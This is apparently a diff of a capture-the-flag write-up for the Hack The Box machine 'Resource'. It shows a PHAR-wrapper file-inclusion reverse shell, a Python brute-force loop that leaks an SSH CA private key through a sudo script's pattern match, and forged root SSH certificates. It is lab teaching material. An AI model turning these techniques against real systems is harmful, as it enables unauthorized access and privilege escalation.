@@ -100,7 +100,7 @@ Both `http://itrc.ssg.htb/?page=/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4
 
 After some research we discover the PHAR (PHP Archive) deserialization attack explained [here](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization) and [here](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability).
 
-> When we create a `.zip` archive containing the `revshell.php` file and access it using the `phar://` stream wrapper, PHP treats the `.zip` as a PHAR-compatible archive. The `phar://` protocol allows PHP to directly access files within the archive, including executable PHP scripts. When the URL `http://itrc.ssg.htb/?page=phar://uploads/.../revshell` is processed, the server executes the `revshell.php` file within the archive as PHP code, triggering the reverse shell. This works because the server uses an insecure file inclusion mechanism (`include`, `require`, or similar) without properly validating or restricting the file path, allowing code execution through the `phar://` wrapper.
+> When we create a `.zip` archive containing the `revshell.php` file and access it using the `phar://` stream wrapper, PHP treats the `.zip` file as a PHAR-compatible archive. The `phar://` protocol allows PHP to directly access files within the archive, including executable PHP scripts. When the URL `http://itrc.ssg.htb/?page=phar://uploads/.../revshell` is processed, the server executes the `revshell.php` file within the archive as PHP code, triggering the reverse shell. This works because the server uses an insecure file inclusion mechanism (`include`, `require`, or similar) without properly validating or restricting the file path, allowing code execution through the `phar://` wrapper.
 
 Using `http://itrc.ssg.htb/?page=phar://uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell` we successfully trigger the reverse shell. We obtain a connection on our listener as `www-data` and we are in `/var/www/itrc`.
 
@@ -178,7 +178,7 @@ ssh-keygen -s ca-itrc -I zzinter_key_id -n zzinter -V +52w id_rsa_zzinter.pub
 
 ![zzinter SSH certificate](/images/HTB-Resource/zzinter_SSH_certificate.png)
 
-3. Login using the SSH certificate.
+3. Login using the SSH key.
 
 ```
 ssh -i id_rsa_zzinter zzinter@itrc.ssg.htb
@@ -245,7 +245,7 @@ Unfortunately the root folder is empty, but we notice a different IP address men
 
 The script contains a list of supported principals, so let's use one of them.
 
-1. Generate an SSH key for support.
+1. Generate an SSH key for `support`.
 
 ```
 ssh-keygen -t rsa -b 4096 -f id_rsa_support
@@ -291,7 +291,7 @@ Examining the script again we see that it uses `curl` to fetch the SSH certifica
 curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
 ```
 
-The content of `sshd_config.d/sshcerts.conf` shows us that a principal file located at `/etc/ssh/auth_principals` is used by SSH on this host. Checking the file we find `zzinter_temp` to be a valid principal namae for `zzinter`.
+The content of `/etc/ssh/sshd_config.d/sshcerts.conf` shows us that a principal file located at `/etc/ssh/auth_principals` is used by SSH on this host. Checking the file we find `zzinter_temp` to be a valid principal namae for `zzinter`.
 
 ![SSH principal file](/images/HTB-Resource/principal_file.png)
 
@@ -338,7 +338,7 @@ The home folder of `zzinter` only contains the user flag, but running `sudo -l` 
 
 ![sudo -l command](/images/HTB-Resource/sudo-l-cmd.png)
 
-The output of `sign_key.sh` is as below. The script is similar to the `sign_key_api.sh` script, it use `ssh-keygen` to sign an SSH public key using a specified CA private key to create a signed SSH certificate. It expects five arguments and also performs a matching operation with the `/etc/ssh/ca-it`. 
+The output of `sign_key.sh` is as below. The script is similar to the `sign_key_api.sh` script, it uses `ssh-keygen` to sign an SSH public key using a specified CA private key to create a signed SSH certificate. It expects five arguments and also performs a matching operation with the `/etc/ssh/ca-it`. 
 
 ```bash
 #!/bin/bash
@@ -407,13 +407,10 @@ For instance if we have a password matching operation with `[[$DB_PASS == mystro
 ```python
 import subprocess
 
-# Characters to test in brute-forcing (alphanumeric + special characters)
 charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\n "
 
-# Initialize discovered CA content with known starting format of SSH keys
 discovered_ca = "-----BEGIN OPENSSH PRIVATE KEY-----\n"
 
-# Use a more fitting name for the temporary CA file
 temp_ca_file = "temp_ca_guess"
 
 while True:
@@ -425,14 +422,12 @@ while True:
         with open(temp_ca_file, "w") as f:
             f.write(current_guess)
         
-        # Run the vulnerable script
         result = subprocess.run(
             ["sudo", "/opt/sign_key.sh", temp_ca_file, "test.pub", "root", "root_user", "1"],
             stdout=subprocess.PIPE,
             text=True
         )
         
-        # Check the output for feedback
         if "Use API for signing with this CA" in result.stdout:
             # Correct character found, append to discovered_ca
             discovered_ca += char
@@ -440,9 +435,7 @@ while True:
             found_character = True
             break  # Break inner loop to continue building the CA string
     
-    # If no new character is found, the CA file content is fully discovered
     if not found_character:
-        # Check for closing marker
         if "-----END OPENSSH PRIVATE KEY-----" in discovered_ca:
             print(f"[!] Full CA content discovered:\n{discovered_ca}")
         else:
@@ -467,8 +460,6 @@ QBAgM=
 
 ![CA content](/images/HTB-Resource/CA_content.png)
 
-
-
 We can go back to our local machine, and generate SSH keys for root.
 
 1. Generate a key pair for root
@@ -489,11 +480,22 @@ chmod 600 root.key
 ssh-keygen -s root.key -z 200 -I root -V -52w:forever -n root_user root.pub
 ```
 
+| Option          | Description                                                                                                                                      |
+| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
+| -s root.key     | Specifies the signing key, which is the private key of the Certificate Authority (CA).                                                           |
+| -z 200          | Specifies the certificate serial number. This is a unique identifier for the certificate.                                                        |
+| -I root         | Specifies the key identity string. The identity (`root`) is an arbitrary label for the certificate.                                               |
+| -V -52w:forever | Specifies the validity period.                                                                                                                   |
+| -n root_user    | Specifies the authorized principals (usernames or roles).                                                                                         |
+| root.pub        | Specifies the public key file being signed. The certificate will be generated for this key, and the resulting file will be named `root-cert.pub`. |
+
 4. Login as root 
 
 ```
 ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub
 ```
+
+> The private key (`root`) provides proof of ownership, while the certificate (`root-cert.pub`) establishes trust between our key and the server. The server validates the certificate using the CA public key stored in its configuration (from `TrustedUserCAKeys`), and then uses the private key to complete the authentication process. The certificate tells the server to trust the public key in `root.pub` because it was signed by the trusted Certificate Authority (CA). Without the certificate, the server wouldn’t recognize the root key as a trusted identity.
 
 ![root ssh login and flag](/images/HTB-Resource/root_flag.png)
 
